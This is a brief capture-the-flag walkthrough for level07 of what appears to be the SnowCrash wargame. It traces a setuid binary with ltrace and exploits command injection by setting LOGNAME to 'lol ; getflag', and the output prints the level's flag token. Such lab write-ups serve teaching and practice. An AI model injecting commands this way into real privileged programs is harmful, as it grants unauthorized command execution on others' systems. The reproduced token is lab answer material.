In this level, we find a level07 binary. running it with ltrace we see what it does :

```bash
ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                           = 2007
geteuid()                                                                           = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                 = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                 = 0
getenv("LOGNAME")                                                                   = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff4f, 0xb7e5ee55, 0xb7fed280)                 = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                              = 0
+++ exited (status 0) +++
```

So it take the LOGNAME environement variable and it prints it with echo.
If we modify LOGNAME as "xxx ; getflag", we will simply inject "getflag". So let's try:

```bash
level07@SnowCrash:~$ export LOGNAME="lol ; getflag"
level07@SnowCrash:~$ ./level07
lol
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```